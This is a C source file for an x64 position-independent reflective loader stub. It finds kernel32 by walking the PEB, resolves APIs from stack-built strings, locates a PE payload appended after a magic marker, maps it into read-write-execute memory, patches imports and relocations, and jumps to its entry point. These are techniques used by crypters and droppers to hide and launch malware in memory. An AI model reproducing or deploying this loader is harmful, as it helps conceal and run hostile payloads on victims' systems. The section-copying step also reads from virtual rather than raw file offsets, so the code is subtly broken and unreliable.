#include <windows.h>
#include <winternl.h>

/**
 * stub.c - x64 Position Independent Reflective Loader
 */

// Custom definition for internal NT structures
typedef struct _LDR_DATA_TABLE_ENTRY_CUSTOM {
    LIST_ENTRY InLoadOrderLinks;
    LIST_ENTRY InMemoryOrderLinks;
    LIST_ENTRY InInitializationOrderLinks;
    void* DllBase;
    void* EntryPoint;
    ULONG SizeOfImage;
    UNICODE_STRING FullDllName;
    UNICODE_STRING BaseDllName;
} LDR_DATA_TABLE_ENTRY_CUSTOM, *PLDR_DATA_TABLE_ENTRY_CUSTOM;

// Function prototypes - all must be inline or defined in this file
static inline void* get_kernel32_base();
static inline void* get_proc_address(void* module, const char* name);
static inline int strings_equal(const char* s1, const char* s2);

__attribute__((section(".text.prologue")))
void stub_entry() {
    // 1. Get Kernel32 Base
    void* k32 = get_kernel32_base();
    if (!k32) return;

    // 2. Resolve basic APIs manually
    char sGetProcAddress[] = {'G','e','t','P','r','o','c','A','d','d','r','e','s','s',0};
    char sLoadLibraryA[] = {'L','o','a','d','L','i','b','r','a','r','y','A',0};
    char sVirtualAlloc[] = {'V','i','r','t','u','a','l','A','l','l','o','c',0};

    typedef FARPROC (WINAPI *GetProcAddress_t)(HMODULE, LPCSTR);
    typedef HMODULE (WINAPI *LoadLibraryA_t)(LPCSTR);
    typedef LPVOID (WINAPI *VirtualAlloc_t)(LPVOID, SIZE_T, DWORD, DWORD);

    GetProcAddress_t pGetProcAddress = (GetProcAddress_t)get_proc_address(k32, sGetProcAddress);
    LoadLibraryA_t pLoadLibraryA = (LoadLibraryA_t)pGetProcAddress((HMODULE)k32, sLoadLibraryA);
    VirtualAlloc_t pVirtualAlloc = (VirtualAlloc_t)pGetProcAddress((HMODULE)k32, sVirtualAlloc);

    // 3. Find the appended PE blob using a marker
    // Marker is 8 bytes: 0xDE 0xAD 0xBE 0xEF 0xCA 0xFE 0xBA 0xBE
    unsigned long long marker = 0xDEADBEEFCAFEBABEULL;

    void* rip_ptr;
    __asm__ ("lea (%%rip), %0" : "=r" (rip_ptr));

    char* search = (char*)rip_ptr;
    int found = 0;
    // Limit search to 1MB to prevent infinite loop
    for (int i = 0; i < 1024 * 1024; i++) {
        if (*(unsigned long long*)search == marker) {
            if (*(unsigned short*)(search + 8) == 0x5A4D) {
                search += 8; // Move past marker to start of PE
                found = 1;
                break;
            }
        }
        search++;
    }
    if (!found) return;

    // 4. Map the PE into new memory
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)search;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)(search + dos->e_lfanew);

    char* image_base = (char*)pVirtualAlloc(NULL, nt->OptionalHeader.SizeOfImage, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (!image_base) return;

    // Copy Headers
    for (DWORD i = 0; i < nt->OptionalHeader.SizeOfHeaders; i++) {
        image_base[i] = search[i];
    }

    // Copy Sections
    PIMAGE_SECTION_HEADER sections = (PIMAGE_SECTION_HEADER)((char*)&nt->OptionalHeader + nt->FileHeader.SizeOfOptionalHeader);
    for (int i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        char* dest = image_base + sections[i].VirtualAddress;
        char* src = search + sections[i].VirtualAddress;
        for (DWORD j = 0; j < sections[i].SizeOfRawData; j++) {
            dest[j] = src[j];
        }
    }

    // 5. Fix Imports
    PIMAGE_NT_HEADERS new_nt = (PIMAGE_NT_HEADERS)(image_base + ((PIMAGE_DOS_HEADER)image_base)->e_lfanew);
    IMAGE_DATA_DIRECTORY import_dir = new_nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
    if (import_dir.Size > 0) {
        PIMAGE_IMPORT_DESCRIPTOR import_desc = (PIMAGE_IMPORT_DESCRIPTOR)(image_base + import_dir.VirtualAddress);
        while (import_desc->Name) {
            HMODULE hMod = pLoadLibraryA(image_base + import_desc->Name);
            if (hMod) {
                PIMAGE_THUNK_DATA thunk = (PIMAGE_THUNK_DATA)(image_base + import_desc->FirstThunk);
                PIMAGE_THUNK_DATA orig_thunk = (PIMAGE_THUNK_DATA)(image_base + import_desc->OriginalFirstThunk);
                if (!import_desc->OriginalFirstThunk) orig_thunk = thunk;

                while (orig_thunk->u1.AddressOfData) {
                    if (IMAGE_SNAP_BY_ORDINAL(orig_thunk->u1.Ordinal)) {
                        thunk->u1.Function = (ULONG_PTR)pGetProcAddress(hMod, (LPCSTR)IMAGE_ORDINAL(orig_thunk->u1.Ordinal));
                    } else {
                        PIMAGE_IMPORT_BY_NAME ibn = (PIMAGE_IMPORT_BY_NAME)(image_base + orig_thunk->u1.AddressOfData);
                        thunk->u1.Function = (ULONG_PTR)pGetProcAddress(hMod, ibn->Name);
                    }
                    thunk++;
                    orig_thunk++;
                }
            }
            import_desc++;
        }
    }

    // 6. Fix Relocations
    ULONG_PTR delta = (ULONG_PTR)image_base - new_nt->OptionalHeader.ImageBase;
    if (delta != 0) {
        IMAGE_DATA_DIRECTORY reloc_dir = new_nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
        if (reloc_dir.Size > 0) {
            PIMAGE_BASE_RELOCATION reloc = (PIMAGE_BASE_RELOCATION)(image_base + reloc_dir.VirtualAddress);
            while (reloc->VirtualAddress != 0) {
                DWORD count = (reloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
                WORD* list = (WORD*)((char*)reloc + sizeof(IMAGE_BASE_RELOCATION));
                for (DWORD i = 0; i < count; i++) {
                    WORD type = list[i] >> 12;
                    WORD offset = list[i] & 0xFFF;
                    if (type == IMAGE_REL_BASED_DIR64) {
                        *(ULONG_PTR*)(image_base + reloc->VirtualAddress + offset) += delta;
                    } else if (type == IMAGE_REL_BASED_HIGHLOW) {
                        *(DWORD*)(image_base + reloc->VirtualAddress + offset) += (DWORD)delta;
                    }
                }
                reloc = (PIMAGE_BASE_RELOCATION)((char*)reloc + reloc->SizeOfBlock);
            }
        }
    }

    // 7. Jump to Entry Point
    ((void(*)())(image_base + new_nt->OptionalHeader.AddressOfEntryPoint))();
}

static inline void* get_kernel32_base() {
    PPEB peb;
#ifdef _WIN64
    __asm__ ("movq %%gs:0x60, %0" : "=r" (peb));
#else
    __asm__ ("movl %%fs:0x30, %0" : "=r" (peb));
#endif
    PLIST_ENTRY list = &peb->Ldr->InMemoryOrderModuleList;
    PLIST_ENTRY entry = list->Flink; // current exe
    entry = entry->Flink; // ntdll.dll
    entry = entry->Flink; // kernel32.dll

    // InMemoryOrderLinks is the second member, so we offset by sizeof(LIST_ENTRY)
    PLDR_DATA_TABLE_ENTRY_CUSTOM data_entry = (PLDR_DATA_TABLE_ENTRY_CUSTOM)((char*)entry - sizeof(LIST_ENTRY));
    return data_entry->DllBase;
}

static inline void* get_proc_address(void* module, const char* name) {
    char* base = (char*)module;
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)base;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)(base + dos->e_lfanew);
    PIMAGE_EXPORT_DIRECTORY exports = (PIMAGE_EXPORT_DIRECTORY)(base + nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

    DWORD* names = (DWORD*)(base + exports->AddressOfNames);
    DWORD* funcs = (DWORD*)(base + exports->AddressOfFunctions);
    WORD* ordinals = (WORD*)(base + exports->AddressOfNameOrdinals);

    for (DWORD i = 0; i < exports->NumberOfNames; i++) {
        char* export_name = base + names[i];
        if (strings_equal(export_name, name)) {
            return base + funcs[ordinals[i]];
        }
    }
    return 0;
}

static inline int strings_equal(const char* s1, const char* s2) {
    while (*s1 && (*s1 == *s2)) {
        s1++;
        s2++;
    }
    return (unsigned char)*s1 == (unsigned char)*s2;
}
